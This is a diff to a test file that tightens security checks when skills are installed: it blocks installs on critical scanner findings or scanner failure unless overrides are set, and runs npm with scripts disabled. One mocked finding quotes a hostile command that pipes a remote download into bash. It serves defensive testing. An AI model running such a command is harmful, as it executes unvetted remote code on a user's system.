@@ -68,6 +68,13 @@ describe("installSkill code safety scanning", () => {
       signal: null,
       killed: false,
     });
+    scanDirectoryWithSummaryMock.mockResolvedValue({
+      scannedFiles: 1,
+      critical: 0,
+      warn: 0,
+      info: 0,
+      findings: [],
+    });
     fetchWithSsrFGuardMock.mockResolvedValue({
       response: {
         ok: true,
@@ -80,10 +87,52 @@ describe("installSkill code safety scanning", () => {
     delete process.env.OPENCLAW_SKILL_DOWNLOAD_MAX_BYTES;
     delete process.env.OPENCLAW_SKILL_ARCHIVE_MAX_ENTRIES;
     delete process.env.OPENCLAW_SKILL_ARCHIVE_MAX_BYTES;
+    delete process.env.OPENCLAW_ALLOW_NPM_SCRIPTS;
+    delete process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
   });
 
-  it("adds detailed warnings for critical findings and continues install", async () => {
+  it("blocks install when critical findings are present", async () => {
     const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    try {
+      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
+          },
+        ],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "danger-skill",
+        installId: "deps",
+      });
+
+      expect(result.ok).toBe(false);
+      expect(result.message).toContain("critical issue");
+      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
+        true,
+      );
+      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
+    } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
+  });
+
+  it("allows critical findings only when explicitly overridden", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    const previousUnsafeInstall = process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
+    process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL = "1";
     try {
       const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
       scanDirectoryWithSummaryMock.mockResolvedValue({
@@ -113,13 +162,17 @@ describe("installSkill code safety scanning", () => {
       expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
         true,
       );
-      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
     } finally {
+      if (previousUnsafeInstall === undefined) {
+        delete process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL;
+      } else {
+        process.env.OPENCLAW_ALLOW_UNSAFE_SKILL_INSTALL = previousUnsafeInstall;
+      }
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
   });
 
-  it("warns and continues when skill scan fails", async () => {
+  it("blocks install when skill scan fails", async () => {
     const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
     try {
       await writeInstallableSkill(workspaceDir, "scanfail-skill");
@@ -131,14 +184,42 @@ describe("installSkill code safety scanning", () => {
         installId: "deps",
       });
 
-      expect(result.ok).toBe(true);
+      expect(result.ok).toBe(false);
+      expect(result.message).toContain("OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL=1");
       expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
         true,
       );
-      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
-        true,
-      );
     } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
+  });
+
+  it("allows skill scan failure only when explicitly overridden", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    const previous = process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL;
+    process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL = "1";
+    try {
+      await writeInstallableSkill(workspaceDir, "scanfail-skill-override");
+      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "scanfail-skill-override",
+        installId: "deps",
+      });
+
+      expect(result.ok).toBe(true);
+      expect(
+        result.warnings?.some((warning) =>
+          warning.includes("continuing install without scanner coverage"),
+        ),
+      ).toBe(true);
+    } finally {
+      if (previous === undefined) {
+        delete process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL;
+      } else {
+        process.env.OPENCLAW_ALLOW_UNSCANNED_SKILL_INSTALL = previous;
+      }
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
   });
@@ -203,6 +284,42 @@ describe("installSkill code safety scanning", () => {
       expect(result.ok).toBe(false);
       expect(result.message).toContain("Download too large");
       expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
+    } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
+  });
+
+  it("runs npm installs with ignore-scripts and scrubbed env by default", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    try {
+      await writeInstallableSkill(workspaceDir, "deps-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 0,
+        warn: 0,
+        info: 0,
+        findings: [],
+      });
+
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "deps-skill",
+        installId: "deps",
+      });
+      expect(result.ok).toBe(true);
+      const installCall = runCommandWithTimeoutMock.mock.calls.find(
+        (call) => Array.isArray(call[0]) && call[0][0] === "npm" && call[0][1] === "install",
+      );
+      expect(installCall).toBeTruthy();
+      const args = installCall?.[0] as string[];
+      const options = installCall?.[1] as {
+        inheritProcessEnv?: boolean;
+        env?: Record<string, string>;
+      };
+      expect(args).toContain("--ignore-scripts");
+      expect(options.inheritProcessEnv).toBe(false);
+      expect(options.env?.npm_config_ignore_scripts).toBe("true");
+      expect(options.env?.NPM_CONFIG_IGNORE_SCRIPTS).toBe("true");
     } finally {
       await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
     }
